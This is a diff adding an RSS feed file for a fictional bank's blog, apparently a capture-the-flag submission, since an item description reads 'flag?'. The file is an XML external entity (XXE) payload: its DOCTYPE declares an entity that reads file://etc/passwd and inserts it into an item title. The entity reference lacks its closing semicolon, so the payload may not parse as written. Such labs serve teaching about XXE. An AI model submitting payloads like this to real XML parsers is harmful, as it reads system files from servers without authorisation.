@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE rss [ <!ENTITY example SYSTEM "file://etc/passwd"> ]>
+<rss version="2.0">
+
+<channel>
+  <title>QuoccaBlog</title>
+  <link>https://blog.quoccabank.com</link>
+  <description>The blogging home of QuoccaBank</description>
+  <generator>https://wordpress.org/?v=6.0</generator>
+  <item>
+    <title>&example</title>
+    <link>https://blog.quoccabank.com/?p=42</link>
+    <description>flag?</description>
+  </item>
+</channel>
+
+</rss>
